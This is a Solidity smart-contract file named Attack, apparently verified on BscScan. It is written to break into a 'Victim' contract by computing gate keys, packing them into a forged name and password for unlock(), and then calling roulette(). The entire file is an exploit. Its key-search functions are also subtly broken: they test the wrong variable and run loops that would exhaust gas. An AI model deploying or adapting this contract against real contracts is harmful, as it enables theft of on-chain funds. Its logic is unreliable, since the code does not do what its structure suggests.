/**
 *Submitted for verification at BscScan.com on 2022-10-23
*/

pragma solidity ^0.8.0;

interface Victim {
    function unlock(bytes32, bytes32) external;
    function roulette(uint256) external;
}


contract Attack {

    Victim victim;
    uint256 masterDivisor = 60001;
    uint256 masterMultiplier = 60001;
    uint256 garbageMultiplier = 2**160-2**153;
    uint256 garbageDivisor = 2**160-2**153;
    uint256 garbageAddress = uint256(uint160(2**153 + 1));
    bool public gate1Unlocked = true;
    uint16 public gateKey1 = 0;  //2        
    uint72 public rouletteStartTime = 2**14;  // Constructor-set  //9

        //SLOT 1
    uint64 public gateKey2 = 0; //8
    uint64 public gateKey3; //8
    uint64[] public gateKeys3;
    bool public gate2Unlocked = true;
    uint64 public gateKey4; //8
    uint64[] public gateKeys4;
    uint56 public gateKey5;  //7

    uint256 gateKey3max = uint256(type(uint64).max)*49/100;
    uint256 gateKey4max = uint256(type(uint64).max)*51 / 100;

 //   uint256 gateKey3max = uint256(uint64(-1))*49/100;
 //   uint256 gateKey4max = uint256(uint64(-1))*51 / 100;
    uint256 masterKeyMin = (2**65+2**56);

      

    constructor(address payable _victim)  {
       victim = Victim(_victim);

    }

    function calcGarbageAddress() public  returns (uint256){
        
        uint256 _garbageAddress = 0;
        while(true){
            if((uint256(_garbageAddress) > 2**153) && (uint256(_garbageAddress) <= 2**160 - ((garbageDivisor-1)))){
                garbageAddress = _garbageAddress;
                return _garbageAddress;
            }
            _garbageAddress++;
        }
    }

    function calcGateKey3() public  {
        
        uint64 _gateKey3;
        while(_gateKey3 < gateKey3max){
            if(probablyPrime(gateKey3)){
                gateKey3 = _gateKey3;
                break ;
            }
            _gateKey3++;
        }
    }

    function calcGateKey4() public  {
        
        uint64 _gateKey4;
        while(_gateKey4 < gateKey4max){
            if(probablyPrime(gateKey4)){
                gateKey4 = _gateKey4;
                break;
            }
            _gateKey4++;
        }
    }

    function calcGateKey5() public  {
        
        uint256 _gateKey5 = masterKeyMin + 2 - (gateKey3 + gateKey4);
        gateKey5 = uint56( _gateKey5);

    }

    function attack1() external {

        bytes memory _name = abi.encodePacked(rouletteStartTime, gateKey1, gate1Unlocked, garbageAddress);
        bytes memory _password = abi.encodePacked(gateKey5, gateKey4, gate2Unlocked, gateKey3, gateKey2);
        victim.unlock( bytes32(_name), bytes32(_password));
    }

    function attack2() external {

        uint256 _secretNumber = 0;
        victim.roulette(_secretNumber);
    }


    // MATH

    function probablyPrime(uint256 n) internal pure returns (bool) {
        uint256 prime = 2;
        if (n == 2 || n == 3) {
            return true;
        }

        if (n % 2 == 0 || n < 2) {
            return false;
        }

        uint256[2] memory values = getValues(n);
        uint256 s = values[0];
        uint256 d = values[1];

        uint256 x = fastModularExponentiation(prime, d, n);

        if (x == 1 || x == n - 1) {
            return true;
        }

        for (uint256 i = s - 1; i > 0; i--) {
            x = fastModularExponentiation(x, 2, n);
            if (x == 1) {
                return false;
            }
            if (x == n - 1) {
                return true;
            }
        }
        return false;
    }

    function fastModularExponentiation(uint256 a, uint256 b, uint256 n) internal pure returns (uint256) {
        a = a % n;
        uint256 result = 1;
        uint256 x = a;

        while(b > 0){
            uint256 leastSignificantBit = b % 2;
            b = b / 2;

            if (leastSignificantBit == 1) {
                result = result * x;
                result = result % n;
            }
            x = mul(x, x);
            x = x % n;
        }
        return result;
    }

    function getValues(uint256 n) internal  pure returns (uint256[2] memory) {
        uint256 s = 0;
        uint256 d = n - 1;
        while (d % 2 == 0) {
            d = d / 2;
            s++;
        }
        uint256[2] memory ret;
        ret[0] = s;
        ret[1] = d;
        return ret;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
    }

 


}